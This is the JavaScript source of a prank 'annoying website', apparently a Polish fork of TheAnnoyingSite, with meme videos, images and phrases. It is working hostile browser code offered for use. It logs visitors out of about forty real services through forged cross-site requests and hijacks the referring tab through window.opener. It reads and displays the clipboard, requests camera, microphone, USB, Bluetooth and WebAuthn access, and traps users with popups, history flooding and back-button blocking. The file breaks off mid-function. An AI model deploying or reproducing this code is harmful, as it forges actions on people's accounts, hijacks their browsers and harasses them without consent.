⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣦⡀⠀⠈⢈⢳⡀⠙⠳⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⠶⠋⠀⢰⣿⡿⠃⠀⣸⣿⠏⡠⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣦⠀⠀⠀⠑⠄⠀⠈⠙⠻⠷⠶⠦⠤⠶⠶⠒⠛⠛⠛⠛⠋⠉⠉⠉⠁⠀⠀⣠⠶⠿⠋⠀⠀⣰⡟⠋⠠⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣷⡕⠀⠀⠀⠄⠁⠢⠤⣤⣤⣀⣀⣀⣤⣤⣤⣶⣶⣶⣶⣶⣶⠾⠶⢞⡿⠟⠁⠀⠀⠀⠀⢰⡿⢀⠔⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣦⠀⠀⠀⠀⢀⣀⢀⠙⣿⣿⣿⣯⣷⣾⣿⣿⣿⣿⠿⢋⡼⠞⠉⠀⠀⠀⠀⠀⠀⢠⡿⣵⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣷⡄⠀⠀⠀⠀⠈⠉⠉⠛⠛⠛⠻⠿⠿⠟⠋⠀⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣷⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠹⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣶⣦⣤⣤⣀⣀⣀⣀⣀⣀⣀⣀⣤⣶⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⢿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  `,
  `
⠀⠀⠀⠀⠀⢀⣤⠖⠒⠒⠒⢒⡒⠒⠒⠒⠒⠒⠲⠦⠤⢤⣤⣄⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⠟⠀⢀⠠⣐⢭⡐⠂⠬⠭⡁⠐⠒⠀⠀⣀⣒⣒⠐⠈⠙⢦⠀⠀⠀
⠀⠀⠀⣰⠏⠀⠐⠡⠪⠂⣁⣀⣀⣀⡀⠰⠀⠀⠀⢨⠂⠀⠀⠈⢢⠀⠀⢹⠀⠀
⠀⣠⣾⠿⠤⣤⡀⠤⡢⡾⠿⠿⠿⣬⣉⣷⠀⠀⢀⣨⣶⣾⡿⠿⠆⠤⠤⠌⡳⣄
⣰⢫⢁⡾⠋⢹⡙⠓⠦⠤⠴⠛⠀⠀⠈⠁⠀⠀⠀⢹⡀⠀⢠⣄⣤⢶⠲⠍⡎⣾
⢿⠸⠸⡇⠶⢿⡙⠳⢦⣄⣀⠐⠒⠚⣞⢛⣀⡀⠀⠀⢹⣶⢄⡀⠀⣸⡄⠠⣃⣿
⠈⢷⣕⠋⠀⠘⢿⡶⣤⣧⡉⠙⠓⣶⠿⣬⣀⣀⣐⡶⠋⣀⣀⣬⢾⢻⣿⠀⣼⠃
⠀⠀⠙⣦⠀⠀⠈⠳⣄⡟⠛⠿⣶⣯⣤⣀⣀⣏⣉⣙⣏⣉⣸⣧⣼⣾⣿⠀⡇⠀
⠀⠀⠀⠘⢧⡀⠀⠀⠈⠳⣄⡀⣸⠃⠉⠙⢻⠻⠿⢿⡿⢿⡿⢿⢿⣿⡟⠀⣧⠀
⠀⠀⠀⠀⠀⠙⢦⣐⠤⣒⠄⣉⠓⠶⠤⣤⣼⣀⣀⣼⣀⣼⣥⠿⠾⠛⠁⠀⢿⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠙⠦⣭⣐⠉⠴⢂⡤⠀⠐⠀⠒⠒⢀⡀⠀⠄⠁⡠⠀⢸⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠲⢤⣀⣀⠉⠁⠀⠀⠀⠒⠒⠒⠉⠀⢀⡾⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠲⠦⠤⠤⠤⠤⠴⠞⠋⠀⠀
  `
]

const SEARCHES = [
  'mango mango',
  'trollface',
  'balkan rage',
  'those who know',
  'hello my name is barack obama',
  'MINGLE MINGLE AGGRESIVE GAMING PHONK REMIX' 
]

const VIDEOS = [
  'media/videos/VID-20250414-WA0000.mp4',
  'media/videos/chicken-song--jgeco.mp4',
  'media/videos/sleepphonk.mp4',
  'media/videos/mangos-mangos-phonk.mp4',
  'media/videos/gelando.mp4',
  'media/videos/gratulacje-użytkowniku.mp4', //zapamiętać: dodać więcej rzeczy
  'media/videos/freestrona.mp4',
  'media/videos/freddy (2).mp4',
  'media/videos/chomik.mp4',
  'media/videos/kongregacja.mp4',
  'media/videos/untitled.mp4', // added by @dan64iel
  'media/videos/warstwy.mp4', //added by @imzeme
  'media/videos/atlantis-dj-konik-special-vocal.mp4' //added by @GameShoot8050
]

const FILE_DOWNLOADS = [
  'media/images/trollface.png',
  'media/images/BALKANRAGE.jpg',
  'media/images/gitarowypies.png',
  'media/images/chomik.png',
  'media/images/krwawyTrollface.png',
  'media/images/trollyfazbear.png',
  'media/images/realistycznyTrollface.jpg',
  'media/images/szkielet.png', // added by @dan64iel
  'media/images/trollfaceminecraft.png', //added by @imzeme
  'media/images/szalonytrollface.png', //added by @imzeme
  'media/images/MANGOMANGOTROLLFACE.png' //added by @MARECKIyt
]

const PHRASES = [
  'mango mango mango mango',
  'flint and meal flint and meal flint and meal flint and meal',
  'TROLLFACE BALKAN RAGE',
  'RAKIETAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
  'noradrenaline noradrenaline noradrenaline noradrenaline noradrenaline noradrenaline',
  'Stillwater those who know skull emoji',
  'geeeeeeeeeeeeeeeeeeeeeeeeeeeermannnnnnnnnnn stareeeeeeeeeeeeeeeeeeeeeeeee',
  'BOOOOOOIIIIIIII WHAT DID YOU SAY ABOUT PACKGOD AND PHONK'
]

const LOGOUT_SITES = {
  Discord: ['POST', 'https://discord.com/api/v9/auth/logout', {provider: null, voip_provider: null}],
  Amazon: ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'],
  DeviantART: ['POST', 'https://www.deviantart.com/users/logout'],
  Dropbox: ['GET', 'https://www.dropbox.com/logout'],
  eBay: ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'],
  GitHub: ['GET', 'https://github.com/logout'],
  GMail: ['GET', 'https://mail.google.com/mail/?logout'],
  Google: ['GET', 'https://www.google.com/accounts/Logout'], // works!
  Hulu: ['GET', 'https://secure.hulu.com/logout'],
  NetFlix: ['GET', 'https://www.netflix.com/Logout'],
  Skype: ['GET', 'https://secure.skype.com/account/logout'],
  SoundCloud: ['GET', 'https://soundcloud.com/logout'],
  'Steam Community': ['GET', 'https://steamcommunity.com/?action=doLogout'],
  'Steam Store': ['GET', 'https://store.steampowered.com/logout/'],
  Wikipedia: ['GET', 'https://en.wikipedia.org/w/index.php?title=Special:UserLogout'],
  'Windows Live': ['GET', 'https://login.live.com/logout.srf'],
  Wordpress: ['GET', 'https://wordpress.com/wp-login.php?action=logout'],
  Yahoo: ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
  YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }],
  JShop: ['GET', 'https://jshop.partners/panel/logout'],
  Vimeo: ['GET', 'https://vimeo.com/log_out'], // added by @intexpression
  Tumblr: ['GET', 'https://www.tumblr.com/logout'], // added by @intexpression
  Allegro: ['GET', 'https://allegro.pl/wyloguj?origin_url=/'], // added by @intexpression
  OnetMail: ['GET', 'https://authorisation.grupaonet.pl/logout.html?state=logout&client_id=poczta.onet.pl.front.onetapi.pl'], // added by @intexpression
  InteriaMail: ['GET', 'https://poczta.interia.pl/logowanie/sso/logout'], // added by @intexpression
  OLX: ['GET', 'https://www.olx.pl/account/logout'], // added by @intexpression
  Roblox:  ['POST', 'https://auth.roblox.com/v2/logout'], // added by @cryblanka
  ChatGPT: ['GET', 'https://chatgpt.com/auth/logout'], // added by @cryblanka
  Guilded:  ['POST', 'https://www.guilded.gg/api/logout'], // added by @cryblanka
  LinkedIn: ['GET', 'https://www.linkedin.com/m/logout/'], // added by @MARECKIyt
  Pinterest: ['GET', 'https://www.pinterest.com/logout/'], // added by @MARECKIyt
  Reddit: ['GET', 'https://www.reddit.com/logout'], // added by @MARECKIyt
  Spotify: ['GET', 'https://www.spotify.com/logout/'], // added by @MARECKIyt
  Microsoft: ['GET', 'https://login.microsoftonline.com/common/oauth2/logout'], // added by @MARECKIyt
  Instagram: ['GET', 'https://www.instagram.com/accounts/logout/'], // added by @MARECKIyt
  Trello: ['GET', 'https://trello.com/logout'], // added by @MARECKIyt
  Baidu: ['GET', 'https://passport.baidu.com/?logout'], // added by @MARECKIyt
  VK: ['GET', 'https://vk.com/exit'], // added by @MARECKIyt
  StackOverflow: ['GET', 'https://stackoverflow.com/users/logout'] // added by @MARECKIyt
}

/**
 * Array to store the child windows spawned by this window.
 */
const wins = []

/**
 * Count of number of clicks  - added by @9fm
 */

let interactionCount = 0

//Bardzo dlugi string xd, ciulowa implementacja ale to chyba lepsze niz ~ 4 miliony znakow w pliku poprostu - added by @9fm

const veryLongString = repeatStringNumTimes(repeatStringNumTimes('zostałeś zptoszkowany!!1 ',100),1500) // - added by @9fm

/**
 * Number of iframes injected into the page for the "super logout" functionality.
 * See superLogout().
 */
let numSuperLogoutIframes = 0

/**
 * Is this window a child window? A window is a child window if there exists a
 * parent window (i.e. the window was opened by another window so `window.opener`
 * is set) *AND* that parent is a window on the same origin (i.e. the window was
 * opened by us, not an external website)
 */
const isChildWindow = (window.opener && isParentSameOrigin()) ||
  window.location.search.indexOf('child=true') !== -1

/**
 * Is this window a parent window?
 */
const isParentWindow = !isChildWindow

/*
 * Run this code in all windows, *both* child and parent windows.
 */

init()

/*
 * Use `window.opener` to detect if this window was opened by another window, which
 * will be its parent. The `window.opener` variable is a reference to the parent
 * window.
 */
if (isChildWindow) initChildWindow()
else initParentWindow()

/**
 * Initialization code for *both* parent and child windows.
 */
function init () {
  confirmPageUnload()

  interceptUserInput(event => {
    interactionCount += 1

    // Prevent default behavior (breaks closing window shortcuts)
    event.preventDefault()
    event.stopPropagation()

    // 'touchstart' and 'touchend' events are not able to open a new window
    // (at least in Chrome), so don't even try. Checking `event.which !== 0` is just
    // a clever way to exclude touch events.
    if (event.which !== 0) openWindow()

    startVibrateInterval()
    enablePictureInPicture()
    triggerFileDownload()

    focusWindows()
    copySpamToClipboard()
    speak()
    startTheramin()

    // Capture key presses on the Command or Control keys, to interfere with the
    // "Close Window" shortcut.
    if (event.key === 'Meta' || event.key === 'Control') {
      window.print()
      requestWebauthnAttestation()
      window.print()
      requestWebauthnAttestation()
      window.print()
      requestWebauthnAttestation()
    } else {
      requestPointerLock()

      if (!window.ApplePaySession) {
        // Don't request TouchID on every interaction in Safari since it blocks
        // the event loop and stops windows from moving
        requestWebauthnAttestation()
      }
      requestClipboardRead()
      requestMidiAccess()
      requestBluetoothAccess()
      requestUsbAccess()
      requestSerialAccess()
      requestHidAccess()
      requestCameraAndMic()
      requestFullscreen()
    }
  })
}

/**
 * Initialization code for child windows.
 */
function initChildWindow () {
  registerProtocolHandlers()
  hideCursor()
  moveWindowBounce()
  startVideo()
  detectWindowClose()
  triggerFileDownload()
  speak()
  rainbowThemeColor()
  animateUrlWithEmojis()

  interceptUserInput(event => {
    if (interactionCount === 1) {
      startAlertInterval()
    }
  })
}

/**
 * Initialization code for parent windows.
 */
function initParentWindow () {
  showHelloMessage()
  blockBackButton()
  fillHistory()
  startInvisiblePictureInPictureVideo()

  interceptUserInput(event => {
    // Only run these on the first interaction
    if (interactionCount === 1) {
      registerProtocolHandlers()
      attemptToTakeoverReferrerWindow()
      hideCursor()
      startVideo()
      startAlertInterval()
      superLogout()
      removeHelloMessage()
      rainbowThemeColor()
      animateUrlWithEmojis()
      speak('To był balkan rage')
    }
  })
}

/**
 * Sites that link to theannoyingsite.com may specify `target='_blank'` to open the
 * link in a new window. For example, Messenger.com from Facebook does this.
 * However, that means that `window.opener` will be set, which allows us to redirect
 * that window. YES, WE CAN REDIRECT THE SITE THAT LINKED TO US.
 * Learn more here: https://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/
 */
function attemptToTakeoverReferrerWindow () {
  if (isParentWindow && window.opener && !isParentSameOrigin()) {
    window.opener.location = `${window.location.origin}/?child=true`
  }
}

/**
 * Returns true if the parent window is on the same origin. It's not enough to check
 * that `window.opener` is set, because that will also get set if a site on a
 * different origin links to theannoyingsite.com with `target='_blank'`.
 */
function isParentSameOrigin () {
  try {
    // May throw an exception if `window.opener` is on another origin
    return window.opener.location.origin === window.location.origin
  } catch (err) {
    return false
  }
}

/**
 * Ask the user "are you sure you want to leave this page?". In most browsers,
 * this will not actually do anything unless the user has at least one interaction
 * with the page before they close it.
 */
function confirmPageUnload () {
  window.addEventListener('beforeunload', event => {
    speak('Please don\'t go!')
    event.returnValue = true
  })
}

/**
 * Attempt to register all possible browser-whitelisted protocols to be handled by
 * this web app instead of their default handlers.
 */
function registerProtocolHandlers () {
  if (typeof navigator.registerProtocolHandler !== 'function') return

  const protocolWhitelist = [
    'bitcoin',
    'geo',
    'im',
    'irc',
    'ircs',
    'magnet',
    'mailto',
    'mms',
    'news',
    'ircs',
    'nntp',
    'sip',
    'sms',
    'smsto',
    'ssh',
    'tel',
    'urn',
    'webcal',
    'wtai',
    'xmpp'
  ]

  const handlerUrl = window.location.href + '/url=%s'

  protocolWhitelist.forEach(proto => {
    navigator.registerProtocolHandler(proto, handlerUrl, 'Ptoszek')
  })
}

/**
 * Attempt to access the user's camera and microphone, and attempt to enable the
 * torch (i.e. camera flash) if the device has one.
 */
function requestCameraAndMic () {
  if (!navigator.mediaDevices ||
      typeof navigator.mediaDevices.getUserMedia !== 'function') {
    return
  }

  navigator.mediaDevices.enumerateDevices().then(devices => {
    const cameras = devices.filter((device) => device.kind === 'videoinput')

    if (cameras.length === 0) return
    const camera = cameras[cameras.length - 1]

    navigator.mediaDevices.getUserMedia({
      deviceId: camera.deviceId,
      facingMode: ['user', 'environment'],
      audio: true,
      video: true
    }).then(stream => {
      const track = stream.getVideoTracks()[0]
      const imageCapture = new window.ImageCapture(track)

      imageCapture.getPhotoCapabilities().then(() => {
        // Let there be light!
        track.applyConstraints({ advanced: [{ torch: true }] })
      }, () => { /* No torch on this device */ })
    }, () => { /* ignore errors */ })
  })
}

/**
 * Animating the URL with emojis
 * See: https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/
 */
function animateUrlWithEmojis () {
  if (window.ApplePaySession) {
    // Safari doesn't show the full URL anyway, so we can't animate it
    return
  }
  const rand = Math.random()
  if (rand < 0.33) {
    animateUrlWithBabies()
  } else if (rand < 0.67) {
    animateUrlWithWave()
  } else {
    animateUrlWithMoons()
  }

  function animateUrlWithBabies () {
    const e = ['🏻', '🏼', '🏽', '🏾', '🏿']

    setInterval(() => {
      let s = ''
      let i; let m

      for (i = 0; i < 10; i++) {
        m = Math.floor(e.length * ((Math.sin((Date.now() / 100) + i) + 1) / 2))
        s += '👶' + e[m]
      }

      window.location.hash = s
    }, 100)
  }

  function animateUrlWithWave () {
    setInterval(() => {
      let i; let n; let s = ''

      for (i = 0; i < 10; i++) {
        n = Math.floor(Math.sin((Date.now() / 200) + (i / 2)) * 4) + 4

        s += String.fromCharCode(0x2581 + n)
      }

      window.location.hash = s
    }, 100)
  }

  function animateUrlWithMoons () {
    const f = ['🌑', '🌘', '🌗', '🌖', '🌕', '🌔', '🌓', '🌒']
    const d = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
    let m = 0

    setInterval(() => {
      let s = ''
      let x = 0

      if (!m) {
        while (d[x] === 4) {
          x++
        }

        if (x >= d.length) m = 1
        else {
          d[x]++
        }
      } else {
        while (d[x] === 0) {
          x++
        }

        if (x >= d.length) m = 0
        else {
          d[x]++

          if (d[x] === 8) d[x] = 0
        }
      }

      d.forEach(function (n) {
        s += f[n]
      })

      window.location.hash = s
    }, 100)
  }
}

/**
 * Lock the user's pointer, without even being in full screen!
 * Require user-initiated event.
 */
function requestPointerLock () {
  const requestPointerLockApi = (
    document.body.requestPointerLock ||
    document.body.webkitRequestPointerLock ||
    document.body.mozRequestPointerLock ||
    document.body.msRequestPointerLock
  )

  requestPointerLockApi.call(document.body)
}

/**
 * Start vibrating the device at random intervals, on supported devices.
 * Requires user-initiated event.
 */
function startVibrateInterval () {
  if (typeof window.navigator.vibrate !== 'function') return
  setInterval(() => {
    const duration = Math.floor(Math.random() * 600)
    window.navigator.vibrate(duration)
  }, 1000)

  // If the gamepad can vibrate, we will at random intervals every second. And at random strengths!
  window.addEventListener('gamepadconnected', (event) => {
    const gamepad = event.gamepad
    if (gamepad.vibrationActuator) {
      setInterval(() => {
        if (gamepad.connected) {
          gamepad.vibrationActuator.playEffect('dual-rumble', {
            duration: Math.floor(Math.random() * 600),
            strongMagnitude: Math.random(),
            weakMagnitude: Math.random()
          })
        }
      }, 1000)
    }
  })
}

/**
 * Intercept all user-initiated events and call the given the function, `onInput`.
 */
function interceptUserInput (onInput) {
  document.body.addEventListener('touchstart', onInput, { passive: false })

  document.body.addEventListener('mousedown', onInput)
  document.body.addEventListener('mouseup', onInput)
  document.body.addEventListener('click', onInput)

  document.body.addEventListener('keydown', onInput)
  document.body.addEventListener('keyup', onInput)
  document.body.addEventListener('keypress', onInput)
}

/**
 * Start an invisible, muted video so we have a one ready to put into
 * picture-in-picture mode on the first user-interaction.
 */
function startInvisiblePictureInPictureVideo () {
  const video = document.createElement('video')
  video.src = getRandomArrayEntry(VIDEOS)
  video.loop = true
  video.muted = true
  video.style = HIDDEN_STYLE
  video.autoplay = true
  video.play()

  document.body.appendChild(video)
}

/**
 * Active Safari's picture-in-picture feature, which let's show a video on the
 * desktop. Requires user-initiated event.
 */
function enablePictureInPicture () {
  const video = document.querySelector('video')
  if (document.pictureInPictureEnabled) {
    video.style = ''
    video.muted = false
    video.requestPictureInPicture()
    video.play()
  }
}

/**
 * Focus all child windows. Requires user-initiated event.
 */
function focusWindows () {
  wins.forEach(win => {
    if (!win.closed) win.focus()
  })
}

/**
 * Open a new popup window. Requires user-initiated event.
 */
function openWindow () {
  const { x, y } = getRandomCoords()
  const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
  const win = window.open(window.location.pathname, '', opts)

  // New windows may be blocked by the popup blocker
  if (!win) return
  wins.push(win)

  if (wins.length === 2) setupSearchWindow(win)

  // Added by @wetraks
  win.onunload = function () {
    // Some browsers might not support onunload, but include it for completeness
    return false;
  };

  // For modern browsers
  win.addEventListener("beforeunload", function (e) {
    e.preventDefault();
    e.returnValue = "";
  });

  // For older browsers
  win.onbeforeunload = function () {
    return "";
  };
  // Added by @wetraks
}

/**
 * Hide the user's cursor!
 */
function hideCursor () {
  document.querySelector('html').style = 'cursor: none;'
}

/**
 * Trigger a file download immediately. One file download is allowed *without* user
 * interaction. Further file downloads should happen in response to a user-initiated
 * event or they will be blocked.
 */
function triggerFileDownload () {
  const fileName = getRandomArrayEntry(FILE_DOWNLOADS)
  const a = document.createElement('a')
  a.href = fileName
  a.download = fileName
  a.click()
}

/**
 * Speak the given `phrase` using text-to-speech.
 */
function speak (phrase) {
  if (phrase == null) phrase = getRandomArrayEntry(PHRASES)
  window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(phrase))
}

/**
 * Start an annoying theramin that changes pitch and volume depending on
 * the mouse position. Uses a Web Audio oscillator. Reauires user-initiated
 * event.
 * Based on https://github.com/feross/TheAnnoyingSite.com/pull/2
 */
function startTheramin () {
  const audioContext = new AudioContext()
  const oscillatorNode = audioContext.createOscillator()
  const gainNode = audioContext.createGain()

  const pitchBase = 50
  const pitchRange = 4000

  const wave = audioContext.createPeriodicWave(
    Array(10).fill(0).map((v, i) => Math.cos(i)),
    Array(10).fill(0).map((v, i) => Math.sin(i))
  )

  oscillatorNode.setPeriodicWave(wave)

  oscillatorNode.connect(gainNode)
  gainNode.connect(audioContext.destination)

  oscillatorNode.start(0)

  const oscillator = ({ pitch, volume }) => {
    oscillatorNode.frequency.value = pitchBase + pitch * pitchRange
    gainNode.gain.value = volume * 3
  }

  document.body.addEventListener('mousemove', event => {
    const { clientX, clientY } = event
    const { clientWidth, clientHeight } = document.body
    const pitch = (clientX - clientWidth / 2) / clientWidth
    const volume = (clientY - clientHeight / 2) / clientHeight
    oscillator({ pitch, volume })
  })
}

/**
 * Attempt to read the user's clipboard.
 * Requires user-initiated event.
 */
function requestClipboardRead () {
  try {
    navigator.clipboard.readText().then(
      data => {
        if (!window.ApplePaySession) {
          // Don't alert in Safari because it blocks the event loop
          window.alert("Successfully read data from clipboard: '" + data + "'")
        }
      },
      () => {}
    )
  } catch {}
}

/**
 * Request Webauthn attestation.
 * Requires user-initiated event.
 */
function requestWebauthnAttestation () {
  try {
    // From https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API
    // This code is public domain, per https://developer.mozilla.org/en-US/docs/MDN/About#Copyrights_and_licenses

    // sample arguments for registration
    const createCredentialDefaultArgs = {
      publicKey: {
      // Relying Party (a.k.a. - Service):
        rp: {
          name: 'Acme'
        },

        // User:
        user: {
          id: new Uint8Array(16),
          name: 'lolica@jaczup.me',
          displayName: 'Ptoszek Jaczupa'
        },

        pubKeyCredParams: [{
          type: 'public-key',
          alg: -7
        }],

        attestation: 'direct',

        timeout: 60000,

        challenge: new Uint8Array([ // must be a cryptographically random number sent from a server
          0x8C, 0x0A, 0x26, 0xFF, 0x22, 0x91, 0xC1, 0xE9, 0xB9, 0x4E, 0x2E, 0x17, 0x1A, 0x98, 0x6A, 0x73,
          0x71, 0x9D, 0x43, 0x48, 0xD5, 0xA7, 0x6A, 0x15, 0x7E, 0x38, 0x94, 0x52, 0x77, 0x97, 0x0F, 0xEF
        ]).buffer
      }
    }

    // sample arguments for login
    const getCredentialDefaultArgs = {
      publicKey: {
        timeout: 60000,
        // allowCredentials: [newCredential] // see below
        challenge: new Uint8Array([ // must be a cryptographically random number sent from a server
          0x79, 0x50, 0x68, 0x71, 0xDA, 0xEE, 0xEE, 0xB9, 0x94, 0xC3, 0xC2, 0x15, 0x67, 0x65, 0x26, 0x22,
          0xE3, 0xF3, 0xAB, 0x3B, 0x78, 0x2E, 0xD5, 0x6F, 0x81, 0x26, 0xE2, 0xA6, 0x01, 0x7D, 0x74, 0x50
        ]).buffer
      }
    }

    // register / create a new credential
    navigator.credentials.create(createCredentialDefaultArgs)
      .then((cred) => {
      // normally the credential IDs available for an account would come from a server
      // but we can just copy them from above...
        const idList = [{
          id: cred.rawId,
          transports: ['usb', 'nfc', 'ble'],
          type: 'public-key'
        }]
        getCredentialDefaultArgs.publicKey.allowCredentials = idList
        return navigator.credentials.get(getCredentialDefaultArgs)
      })
  } catch {}
}

/**
 * Request access to MIDI devices.
 * Requires user-initiated event.
 */
function requestMidiAccess () {
  try {
    navigator.requestMIDIAccess({
      sysex: true
    })
  } catch {}
}

/**
 * Request access to Bluetooth devices.
 * Requires user-initiated event.
 */
function requestBluetoothAccess () {
  try {
    navigator.bluetooth.requestDevice({
      // filters: [...] <- Prefer filters to save energy & show relevant devices.
      // acceptAllDevices here ensures dialog can populate, we don't care with what.
      acceptAllDevices: true
    })
      .then(device => device.gatt.connect())
  } catch {}
}

/**
 * Request access to USB devices.
 * Requires user-initiated event.
 */
function requestUsbAccess () {
  try {
    navigator.usb.requestDevice({ filters: [{}] })
  } catch {}
}

/**
 * Request access to Serial devices.
 * Requires user-initiated event.
 */
function requestSerialAccess () {
  try {
    navigator.serial.requestPort({ filters: [] })
  } catch {}
}

/**
 * Request access to HID devices.
 * Requires user-initiated event.
 */
function requestHidAccess () {
  try {
    navigator.hid.requestDevice({ filters: [] })
  } catch {}
}

/**
 * Move the window around the screen and bounce off of the screen edges.
 */
function moveWindowBounce () {
  let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
  let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1)

  setInterval(() => {
    const x = window.screenX
    const y = window.screenY
    const width = window.outerWidth
    const height = window.outerHeight

    if (x < MARGIN) vx = Math.abs(vx)
    if (x + width > SCREEN_WIDTH - MARGIN) vx = -1 * Math.abs(vx)
    if (y < MARGIN + 20) vy = Math.abs(vy)
    if (y + height > SCREEN_HEIGHT - MARGIN) vy = -1 * Math.abs(vy)

    window.moveBy(vx, vy)
  }, TICK_LENGTH)
}

/**
 * Show a random troll video in the window.
 */
function startVideo () {
  const video = document.createElement('video')

  video.src = getRandomArrayEntry(VIDEOS)
  video.autoplay = true
  video.loop = true
  video.style = 'width: 100%; height: 100%;'

  document.body.appendChild(video)
}

/**
 * When a child window closes, notify the parent window so it can remove it from
 * the list of child windows.
 */
function detectWindowClose () {
  window.addEventListener('unload', () => {
